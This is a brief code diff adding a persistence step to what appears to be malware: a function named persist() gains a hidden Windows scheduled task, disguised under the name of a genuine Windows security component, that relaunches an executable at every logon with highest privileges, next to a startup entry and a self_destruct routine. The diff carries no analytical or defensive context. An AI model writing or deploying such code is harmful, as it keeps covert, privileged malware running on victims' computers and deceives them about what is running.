@@ -86,6 +86,13 @@ def persist() -> str:
         res.append("Startup OK")
     except Exception as e:
         res.append(f"Startup fail: {e}")
+    try:
+        task_name = "SecurityHealthSystray"
+        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe}\"" /sc onlogon /rl highest /f'
+        subprocess.check_output(cmd, shell=True, creationflags=CREATE_NO_WINDOW, stderr=subprocess.STDOUT)
+        res.append("TaskScheduler OK")
+    except Exception as e:
+        res.append(f"TaskScheduler fail: {e}")
     return " | ".join(res)
 
 def self_destruct() -> None:
